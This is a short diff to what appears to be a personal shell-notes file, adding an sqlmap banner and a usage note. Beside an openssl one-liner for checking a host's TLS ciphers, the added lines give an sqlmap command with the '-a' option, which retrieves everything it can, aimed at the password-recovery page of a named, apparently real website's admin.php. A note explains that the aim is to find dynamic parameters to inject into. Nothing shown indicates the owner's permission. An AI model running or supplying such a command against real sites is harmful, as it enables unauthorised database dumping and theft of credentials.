@@ -16,3 +16,15 @@ alias urls=" sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^<]*\)\(.*\)/\1
 # Identify what SSL TLS version is running on the remote hostname
 echo "" | openssl s_client -connect $1:443 2>&1 | grep Cipher | awk '{print $NF}' | grep -Ev "($(openssl ciphers -v 'ALL:ALL' | grep -Ei "(gcm|pfs)" | grep -Ei "(ec|dhe)" | grep 256 | awk '{print "TLS_"$1}' | tr '-' '_' | tr '\n' '|' | head -c -1))"
  
+
+
+
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.7.9.3#dev}
+|_ -| . [(]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+               Running SQLMap - Various options I typically use:
+sqlmap --url "https://tiatrue.com/admin.php?target=recover_password&valid=0" --dbms=mysql --random-agent --level 3 -a
+Note: The goal is to find a dynamic parameter or multiple and run sqlmap on that.  As seen above.
